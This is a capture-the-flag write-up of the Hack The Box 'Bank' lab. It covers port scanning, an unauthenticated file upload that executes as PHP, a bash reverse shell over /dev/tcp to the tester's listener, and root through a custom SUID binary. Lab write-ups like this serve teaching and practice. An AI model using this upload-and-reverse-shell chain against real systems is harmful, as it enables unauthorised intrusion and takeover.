# Hack The Box: Bank

| Field | Value |
| --- | --- |
| Machine | Bank (Linux, Easy) |
| Date | 26 September 2026 |
| Target for this session | `10.129.29.200` |
| Hostname | `bank.htb` |
| Initial access | Unauthenticated upload through `support.php`, followed by PHP execution |
| Privilege escalation | Custom root-owned SUID program `/var/htb/bin/emergency` |

The target IP belonged to this lab session and will change when the machine is restarted. This writeup documents direct access to the upload handler without logging in.

## Reconnaissance

The initial scan checked the most common TCP ports and identified three services:

```bash
nmap -sV --open -oN bank-initial.txt 10.129.29.200
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14
80/tcp open  http    Apache httpd 2.4.7
```

The web application used a name-based virtual host. I mapped its hostname to the target and visited `http://bank.htb/`:

```bash
echo '10.129.29.200 bank.htb' >> /etc/hosts
```

The site displayed a PHP login page. I enumerated the web application's paths to identify functionality beyond that landing page.

## Web content discovery

Directory enumeration against the **hostname**, rather than only the target IP, found several PHP pages and directories:

```bash
gobuster dir -u http://bank.htb/ \
  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
  -x php -t 20 -o bank-web.txt
```

The useful results were:

```text
index.php    (Status: 302) [Size: 7322] [--> login.php]
login.php    (Status: 200) [Size: 1974]
support.php  (Status: 302) [Size: 3291] [--> login.php]
uploads      (Status: 301) [--> http://bank.htb/uploads/]
logout.php   (Status: 302) [Size: 0] [--> index.php]
```

The size column mattered. `logout.php` returned an empty redirect, while `support.php` redirected to `login.php` **and** returned more than 3 KB of content. Browsers automatically follow the `Location` header and show the login page, concealing the first response. `curl` without `-L` displays the original response body:

```bash
curl -si http://bank.htb/support.php | sed -n '1,140p'
curl -sS http://bank.htb/support.php |
  rg -n -i '<form|<input|<textarea|<select|<button'
```

The body contained a support-ticket form. It submitted a multipart POST back to `support.php` with these fields:

| Field | Purpose |
| --- | --- |
| `title` | Ticket title |
| `message` | Ticket body |
| `fileToUpload` | File attachment |
| `submitadd` | Submit button |

The form's HTML source also contained a developer comment stating that the `.htb` extension had been configured to execute as PHP for debugging:

```bash
curl -sS http://bank.htb/support.php | sed -n '28,75p'
```

The comment identified an extension that would execute as PHP. The upload handler still needed to accept an unauthenticated POST for this route to work.

## Unauthenticated upload and PHP execution

I uploaded a `.htb` file containing a distinctive output marker from a fresh `curl` client, without an authentication cookie:

```bash
printf '%s\n' '<?php echo "BANK_EXEC_OK"; ?>' > probe.htb

curl -sS -i \
  -F 'title=Probe' \
  -F 'message=Testing upload' \
  -F 'fileToUpload=@probe.htb;type=text/plain' \
  -F 'submitadd=' \
  http://bank.htb/support.php |
  rg -i '^(HTTP/|Location:)|swal|upload|error'
```

The response still carried a `302` to `login.php`, but its body reported that the ticket was created and linked to `/uploads/probe.htb`. I then requested that path:

```bash
curl -sS -i http://bank.htb/uploads/probe.htb | sed -n '1,25p'
```

```text
HTTP/1.1 200 OK
X-Powered-By: PHP/5.5.9-1ubuntu4.21

BANK_EXEC_OK
```

The marker confirmed both parts of the foothold: the server accepted the unauthenticated upload, and Apache executed `.htb` files as PHP.

## Reverse shell and user flag

I started a listener on Kali:

```bash
nc -lvnp 4444
```

In another terminal, I retrieved Kali's current `tun0` address, then created and submitted a PHP reverse shell with the allowed `.htb` extension:

```bash
LHOST=$(ip -4 -o addr show tun0 | awk '{split($4, a, "/"); print a[1]}')

cat > foothold.htb <<PHP
<?php system("/bin/bash -c '/bin/bash -i >& /dev/tcp/${LHOST}/4444 0>&1'"); ?>
PHP

curl -sS \
  -F 'title=Support request' \
  -F 'message=Attachment' \
  -F 'fileToUpload=@foothold.htb;type=text/plain' \
  -F 'submitadd=' \
  http://bank.htb/support.php |
  rg -i 'foothold.htb|swal'
```

Requesting the uploaded file triggered the reverse connection:

```bash
curl -sS http://bank.htb/uploads/foothold.htb
```

The trigger request can remain open while the reverse shell is running. The listener received a shell as `www-data`. I read the user flag from the home directories:

```bash
id
find /home -name user.txt -type f 2>/dev/null
cat /home/*/user.txt
```

## Local enumeration and root

From the `www-data` shell, I collected basic host details and searched for SUID programs:

```bash
id
hostname
uname -a
find / -type f -perm -4000 2>/dev/null
```

The system reported a 32-bit Ubuntu kernel (`4.4.0-79-generic`, `i686`). The SUID list included familiar system utilities such as `/bin/mount`, `/bin/su`, and `/usr/bin/passwd`, as well as an unusual program under an application-specific path:

```text
/var/htb/bin/emergency
```

I compared that program with a standard SUID binary and inspected its file type:

```bash
ls -l /bin/mount /var/htb/bin/emergency
file /var/htb/bin/emergency
```

```text
-rwsr-xr-x 1 root root  88752 Nov 24  2016 /bin/mount
-rwsr-xr-x 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency
/var/htb/bin/emergency: setuid ELF 32-bit LSB shared object, Intel 80386, stripped
```

`/bin/mount` being SUID was not, by itself, an exploit. A custom root-owned SUID executable in `/var/htb/bin/` was a stronger candidate. Running it provided effective root privileges:

```bash
/var/htb/bin/emergency
id
cat /root/root.txt
```

The program reported `uid=33(www-data)` with `euid=0(root)`, and the root flag was readable.
